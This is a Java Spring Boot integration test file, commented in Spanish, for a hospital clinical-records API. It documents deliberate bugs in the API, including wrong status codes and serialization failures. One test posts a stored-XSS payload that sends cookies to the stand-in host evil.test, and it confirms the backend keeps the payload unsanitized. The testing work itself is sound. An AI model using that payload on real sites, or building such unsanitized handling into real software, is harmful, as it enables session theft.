package com.hospital.controller;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.hospital.dto.HistoriaClinicaDTO;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.transaction.annotation.Transactional;

import static org.hamcrest.Matchers.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.*;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

/**
 * Pruebas de integracion Controller -> Service -> Repository -> H2 en memoria.
 *
 * HistoriaClinica tiene DOS relaciones @ManyToOne LAZY (paciente, doctor), por lo que
 * sufre el mismo BUG-01 identificado en CitaControllerIntegrationTest (falta de
 * jackson-datatype-hibernate6 para resolver proxies de Hibernate). Se documenta el
 * comportamiento real de cada endpoint.
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.MOCK)
@AutoConfigureMockMvc
@ActiveProfiles("test")
@Transactional
@DisplayName("HistoriaClinicaController - integracion")
class HistoriaClinicaControllerIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    @Test
    @DisplayName("GET /api/historias-clinicas responde 500 al serializar (mismo BUG-01 que CitaController)")
    void listar_reproduceEl500DeSerializacion() throws Exception {
        mockMvc.perform(get("/api/historias-clinicas"))
                .andExpect(status().isInternalServerError())
                .andExpect(jsonPath("$.status", is(500)));
    }

    @Test
    @DisplayName("GET /api/historias-clinicas/{id} responde 500 al serializar (mismo BUG-01)")
    void buscar_conIdExistente_reproduceEl500DeSerializacion() throws Exception {
        mockMvc.perform(get("/api/historias-clinicas/1"))
                .andExpect(status().isInternalServerError())
                .andExpect(jsonPath("$.status", is(500)));
    }

    @Test
    @DisplayName("GET /api/historias-clinicas/{id} con ID inexistente responde 200 en vez de 404 (bug documentado)")
    void buscar_conIdInexistente_documentaBugDeStatus200() throws Exception {
        mockMvc.perform(get("/api/historias-clinicas/9999"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status", is(404)));
    }

    @Test
    @DisplayName("POST /api/historias-clinicas con datos validos SI responde 200 (paciente/doctor ya resueltos en la transaccion)")
    void crear_conDatosValidos_debeCrearYResponderOk() throws Exception {
        // A diferencia de los GET, aqui el servicio carga paciente/doctor via findById()
        // ANTES de guardar, por lo que quedan como entidades resueltas (no proxies) en la
        // sesion, y Jackson SI puede serializar la respuesta. Confirma que el BUG-01 es
        // especificamente sobre proxies LAZY sin resolver, no sobre las entidades en si.
        HistoriaClinicaDTO dto = new HistoriaClinicaDTO();
        dto.setPacienteId(2L);
        dto.setDoctorId(2L);
        dto.setDiagnostico("Gripe estacional");
        dto.setTratamiento("Reposo e hidratacion");
        dto.setObservaciones("Revision en una semana");

        mockMvc.perform(post("/api/historias-clinicas")
                        .contentType("application/json")
                        .content(objectMapper.writeValueAsString(dto)))
                // BUG INTENCIONAL: 200 en vez de 201.
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.diagnostico", is("Gripe estacional")))
                .andExpect(jsonPath("$.paciente.nombre", is("Maria")))
                .andExpect(jsonPath("$.doctor.nombre", is("Miguel")));
    }

    @Test
    @DisplayName("POST /api/historias-clinicas sin doctor (opcional) tambien responde 200")
    void crear_sinDoctor_debeCrearYResponderOk() throws Exception {
        HistoriaClinicaDTO dto = new HistoriaClinicaDTO();
        dto.setPacienteId(2L);
        dto.setDiagnostico("Control de rutina sin doctor asignado");

        mockMvc.perform(post("/api/historias-clinicas")
                        .contentType("application/json")
                        .content(objectMapper.writeValueAsString(dto)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.doctor", nullValue()));
    }

    @Test
    @DisplayName("POST /api/historias-clinicas sin diagnostico (obligatorio) responde 400")
    void crear_sinDiagnostico_debeResponder400() throws Exception {
        HistoriaClinicaDTO dto = new HistoriaClinicaDTO();
        dto.setPacienteId(1L);

        mockMvc.perform(post("/api/historias-clinicas")
                        .contentType("application/json")
                        .content(objectMapper.writeValueAsString(dto)))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.errors.diagnostico", is("El diagnostico es obligatorio")));
    }

    @Test
    @DisplayName("POST /api/historias-clinicas con paciente inexistente responde 200 con status 404 embebido (bug documentado)")
    void crear_conPacienteInexistente_documentaBugDeStatus200() throws Exception {
        HistoriaClinicaDTO dto = new HistoriaClinicaDTO();
        dto.setPacienteId(9999L);
        dto.setDiagnostico("Diagnostico de prueba");

        mockMvc.perform(post("/api/historias-clinicas")
                        .contentType("application/json")
                        .content(objectMapper.writeValueAsString(dto)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status", is(404)))
                .andExpect(jsonPath("$.message", containsString("Paciente no encontrado")));
    }

    @Test
    @DisplayName("POST /api/historias-clinicas no sanitiza HTML/script en el diagnostico (XSS almacenado real)")
    void crear_conDiagnosticoConScript_persisteSinSanitizar() throws Exception {
        // BUG INTENCIONAL confirmado en integracion real (persistencia + respuesta):
        // el backend guarda y devuelve el payload tal cual, sin escapar ni sanitizar.
        // Si el frontend lo renderiza con innerHTML sin escapar, es un XSS almacenado
        // explotable (ver informe OWASP, Paso 7).
        String payload = "<script>document.location='https://evil.test/steal?c='+document.cookie</script>";

        HistoriaClinicaDTO dto = new HistoriaClinicaDTO();
        dto.setPacienteId(1L);
        dto.setDiagnostico(payload);

        mockMvc.perform(post("/api/historias-clinicas")
                        .contentType("application/json")
                        .content(objectMapper.writeValueAsString(dto)))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.diagnostico", is(payload)));
    }

    @Test
    @DisplayName("GET /api/historias-clinicas/paciente/{id} responde 500 al serializar (mismo BUG-01)")
    void listarPorPaciente_reproduceEl500DeSerializacion() throws Exception {
        mockMvc.perform(get("/api/historias-clinicas/paciente/1"))
                .andExpect(status().isInternalServerError());
    }

    @Test
    @DisplayName("GET /api/historias-clinicas/doctor/{id} responde 500 al serializar (mismo BUG-01)")
    void listarPorDoctor_reproduceEl500DeSerializacion() throws Exception {
        mockMvc.perform(get("/api/historias-clinicas/doctor/1"))
                .andExpect(status().isInternalServerError());
    }
}
